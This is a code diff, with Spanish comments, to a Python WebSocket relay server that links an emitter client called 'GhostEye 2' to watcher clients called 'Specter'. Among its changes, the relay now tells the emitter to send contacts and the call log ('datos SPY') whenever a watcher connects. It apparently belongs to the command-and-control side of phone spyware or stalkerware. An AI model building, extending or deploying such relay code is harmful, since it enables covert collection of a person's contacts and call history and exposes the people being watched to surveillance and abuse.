@@ -48,6 +48,10 @@ async def cleanup_code(code, role, ws):
         listener = listeners.get(code)
         if listener and not listener.closed:
             await safe_send_str(listener, "EMITTER_GONE")
+        # ── FIX 2: notificar EMITTER_GONE a todos los watchers ──
+        for w in list(watchers.get(code, set())):
+            if not w.closed:
+                await safe_send_str(w, "EMITTER_GONE")
 
     elif role == "JOIN":
         if listeners.get(code) is ws:
@@ -129,6 +133,12 @@ async def handle(request):
             listener = listeners.get(code)
             if listener and not listener.closed:
                 await safe_send_str(ws, "READY")
+
+            # ── FIX 3: notificar EMITTER_BACK a watchers ya conectados ──
+            # (Specter puede haber conectado antes que GhostEye 2)
+            for w in list(watchers.get(code, set())):
+                if not w.closed:
+                    await safe_send_str(w, "EMITTER_BACK")
 
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.BINARY:
@@ -223,16 +233,15 @@ async def handle(request):
         # ── SPECTER solo info (WATCH) ──
         elif text.startswith("WATCH:"):
             code = text[6:].strip()
-            if code not in emitters:
-                await safe_send_str(ws, "ERROR:INVALID_CODE")
-                await ws.close()
-                return ws
 
+            # ── FIX 1: aceptar WATCH aunque el emisor no esté aún ──
+            # Specter puede arrancar antes que GhostEye 2.
+            # Cuando GhostEye 2 conecte recibirá EMITTER_BACK.
             role = "WATCH"
             if code not in watchers:
                 watchers[code] = set()
             watchers[code].add(ws)
-            log(code, f"WATCH conectado  total={len(watchers[code])}")
+            log(code, f"WATCH conectado  total={len(watchers[code])}  emisor={'SI' if code in emitters else 'NO'}")
             await safe_send_str(ws, "WATCHING")
 
             if code in last_info:
@@ -241,6 +250,9 @@ async def handle(request):
             emitter = emitters.get(code)
             if emitter and not emitter.closed:
                 await safe_send_str(emitter, "GET_INFO")
+                # ── FIX 3: pedir datos SPY al emisor cuando llega un watcher ──
+                await safe_send_str(emitter, "GET_CONTACTS")
+                await safe_send_str(emitter, "GET_CALL_LOG")
 
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.TEXT:
@@ -281,7 +293,7 @@ async def main():
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
-    print(f"Relay PRO v2 corriendo en puerto {port}")
+    print(f"Relay PRO v3 corriendo en puerto {port}")
     asyncio.ensure_future(self_ping(app))
     await asyncio.Future()
 
